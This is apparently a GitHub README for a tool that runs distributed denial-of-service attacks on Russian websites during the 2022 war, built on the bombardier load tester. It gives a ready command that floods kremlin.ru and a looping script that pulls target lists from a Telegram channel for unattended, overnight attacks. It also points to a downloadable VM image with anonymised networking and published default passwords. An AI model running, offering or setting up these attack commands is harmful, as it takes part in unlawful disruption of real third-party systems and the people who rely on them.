# fuckputin

🇺🇦 A DDoS helper tool to bring down enemy websites - based on [bombardier](https://github.com/codesenberg/bombardier) 🇺🇦

### [Інструкція українською](./README_UA.md)
### [Инструкция на русском](./README_RU.md)

### Simplified instruction - manual execution
- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
- `docker run -it alpine/bombardier -c 1000 -d 60s -l https://kremlin.ru`
- Last part of the comand is host url, you should pick one [from the last chat messages](https://t.me/itarmyofukraine2022)  

Automatic script performs the same command and loops through a list of hosts, so you can leave it unsupervised overnight or for long periods of time. It also automatically fetches updates to the list.

### Get the code
- Clone the repo - `git clone https://github.com/v1adko/fuckputin.git`   
  or  
[download a zip](https://github.com/v1adko/fuckputin/archive/refs/heads/master.zip) if git clone is taking too long
- Change working directory - `cd ./fuckputin`
- Optionally update [the targets](#targets)

### Targets

Best update targets from [this telegram channel](https://t.me/itarmyofukraine2022)  
Edit contents of the [./fucklist.sh](/fucklist.sh) file

### Run in Docker

*Note*: this could take quite some time, if you're tech-savvy enough,  
try [installing binaries manually](#local) directly on your host system,  
it should be faster

- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
- Optionally update [the targets](#targets)
- `docker-compose up --build` (on some systems compose is not installed with docker)
   **or**
- `docker build -t fuckputin .`
- `docker run fuckputin`

### Local

- Install Go - [Instructions](https://go.dev/doc/install)
- Install bombardier [by downloading a binary](https://github.com/codesenberg/bombardier/releases)
- Run `./fuckputin-local.sh`

### Run

### VirtualBox OVA based on Parrot Security Linux (fuckputler) with LUKS Encription & AnonSurf per default after start.

- Just Dowload VirtualBox for your System (Linux, Mac, Windows) here: https://www.virtualbox.org/
- Install VirtualBox in your System
- Download OVA of putlerkaput Linux here: https://mega.nz/file/TlsmHKQS#QLvyKQyFcdqXtH09vYKLa4054xVp7D6U7iDfjGfeKHk
- Just double click on OVA File or import it to your VirtualBox
- Maybe you have to set EFI BIOS Setting and uncheck VT (Virt. Tech for CPU)
- Try to start the system - 1st LUKS password is putlerkaput2022! (can be changed)
- If started, userpassword is the same putlerkaput2022! (can be changed)
- As next one you have to provide your WiFi Passowrd or connect your LAN Cabel, we need internet connection :)
- Then check your IP (Check my IP Icon on desktop / or in Browser iplocation.org), if it not yours - open folder "fuckputin" on desktop and doubleclick on start-fucking.sh (this README you can find also on the desktop);
- Enjoy! :) And plz keep this a life so long you can! 

### LiveUSB Version based on ventoy of putlerkaput dist comming soon ... 

Now leave the process running for as much as you can
Thank you for fighting on our side! 💪 🇺🇦
